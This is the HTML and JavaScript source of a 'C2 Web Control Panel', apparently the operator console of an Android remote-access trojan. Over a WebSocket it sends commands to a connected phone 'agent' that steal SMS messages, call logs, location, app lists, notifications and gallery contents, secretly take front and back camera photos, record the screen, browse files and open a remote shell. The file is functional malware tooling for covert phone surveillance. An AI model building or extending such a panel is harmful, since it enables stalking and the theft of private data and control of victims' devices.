<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Control Panel</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #1a1a1a; color: #e0e0e0; margin: 0; padding: 20px; font-size: 14px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1, h2 { color: #4a90e2; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .status-bar { padding: 10px; background-color: #333; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .status-light { height: 15px; width: 15px; border-radius: 50%; background-color: #f00; transition: background-color 0.5s ease; }
        .status-light.connected { background-color: #0f0; }
        .button-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-top: 15px; }
        button { background-color: #4a90e2; color: white; border: none; padding: 12px; border-radius: 5px; cursor: pointer; font-size: 1em; transition: background-color 0.2s; }
        button:hover { background-color: #357abd; }
        button:disabled { background-color: #555; cursor: not-allowed; }
        .input-group { margin-top: 15px; display: flex; gap: 10px; }
        input[type="text"] { flex-grow: 1; padding: 10px; border-radius: 4px; border: 1px solid #555; background-color: #333; color: #e0e0e0; font-size: 1em; }
        .log-area { background-color: #000; padding: 15px; border-radius: 5px; height: 400px; overflow-y: auto; font-family: 'SF Mono', 'Consolas', 'Courier New', monospace; margin-top: 20px; border: 1px solid #333; white-space: pre-wrap; word-wrap: break-word; }
        .log-entry { padding: 5px 0; border-bottom: 1px solid #222; }
        .log-entry.error { color: #ff6b6b; }
        .log-entry.info { color: #87ceeb; }
        .log-entry.sms { color: #98fb98; }
        .log-entry.call { color: #f0e68c; }
    </style>
</head>
<body>
    <div class="container">
        <h1>C2 Web Control Panel</h1>
        <div class="status-bar">
            <span>Agent Status:</span>
            <div id="statusLight" class="status-light"></div>
        </div>

        <h2>Core Commands</h2>
        <div class="button-grid" id="commandButtons">
            <button onclick="sendCommand('getsms')">Get SMS</button>
            <button onclick="sendCommand('getcalllogs')">Get Call Logs</button>
            <button onclick="sendCommand('list_app')">List Apps</button>
            <button onclick="sendCommand('get_location')">Get Location</button>
            <button onclick="sendCommand('deviceinfo')">Device Info</button>
            <button onclick="sendCommand('screen_recorder')">Screen Recorder (20s)</button>
        </div>

        <h2>Interactive Modes</h2>
        <div class="button-grid" id="modeButtons">
            <button onclick="sendCommand('filemanager')">File Manager</button>
            <button onclick="sendCommand('shell')">Shell</button>
            <button onclick="sendCommand('notifikasi')">Notifications</button>
            <button onclick="sendCommand('gallery')">Gallery</button>
        </div>

        <h2>Camera & Flash</h2>
        <div class="button-grid">
            <button onclick="sendCommand('takefrontpic')">Take Front Pic</button>
            <button onclick="sendCommand('takebackpic')">Take Back Pic</button>
            <button onclick="sendCommand('flashon')">Flash On</button>
            <button onclick="sendCommand('flashoff')">Flash Off</button>
        </div>

        <h2>Advanced Commands</h2>
        <div class="input-group">
            <input type="text" id="textInput" placeholder="Enter command, URL, package name, or toast message...">
            <button onclick="executeTextInput()">Send</button>
        </div>
        <small>Use with: `open`, `run`, `toast on`, `cd`, `get`, etc. See logs for mode-specific commands.</small>

        <h2>Agent Logs & Output</h2>
        <div class="log-area" id="logArea"></div>
    </div>

    <script>
        const logArea = document.getElementById('logArea');
        const statusLight = document.getElementById('statusLight');
        const commandButtons = document.querySelectorAll('#commandButtons button, #modeButtons button, .input-group button');
        const textInput = document.getElementById('textInput');

        let ws;

        function connect() {
            // Use wss for secure websocket connection, which is required for pages served over https.
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}`;

            log('Attempting to connect to server...', 'info');
            ws = new WebSocket(wsUrl);

            ws.onopen = () => {
                log('WebSocket connection established.', 'info');
            };

            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    handleServerMessage(data);
                } catch (e) {
                    log(`Received raw data: ${event.data}`, 'raw');
                }
            };

            ws.onclose = () => {
                log('WebSocket disconnected. Retrying in 5 seconds...', 'error');
                setAgentStatus(false);
                setTimeout(connect, 5000);
            };

            ws.onerror = (error) => {
                log('WebSocket error. See console for details.', 'error');
                console.error("WebSocket Error:", error);
            };
        }

        function setAgentStatus(isConnected) {
            if (isConnected) {
                statusLight.classList.add('connected');
                commandButtons.forEach(b => b.disabled = false);
            } else {
                statusLight.classList.remove('connected');
                commandButtons.forEach(b => b.disabled = true);
            }
        }

        function log(message, type = 'log') {
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logArea.appendChild(entry);
            logArea.scrollTop = logArea.scrollHeight;
        }

        function handleServerMessage(message) {
            // Main data envelope from agent has a 'data' key
            const payload = message.data || message;
            const type = payload.type || 'UNKNOWN';

            if (type === 'status') {
                if (payload.payload === 'agent_connected') {
                    setAgentStatus(true);
                    log('Android Agent has connected.', 'info');
                } else if (payload.payload === 'agent_disconnected') {
                    setAgentStatus(false);
                    log('Android Agent has disconnected.', 'error');
                }
                return;
            }

            // For other messages, just pretty-print the JSON
            log(JSON.stringify(payload, null, 2), type.toLowerCase());
        }

        function sendCommand(command) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                log(`Sending command: ${command}`, 'info');
                ws.send(command);
            } else {
                log('Cannot send command. WebSocket is not open.', 'error');
            }
        }

        function executeTextInput() {
            const command = textInput.value.trim();
            if (command) {
                sendCommand(command);
                textInput.value = ''; // Clear input after sending
            }
        }

        textInput.addEventListener("keyup", function(event) {
            if (event.key === "Enter") {
                executeTextInput();
            }
        });

        window.onload = () => {
            setAgentStatus(false); // Initially disconnected
            connect();
        };
    </script>
</body>
</html>
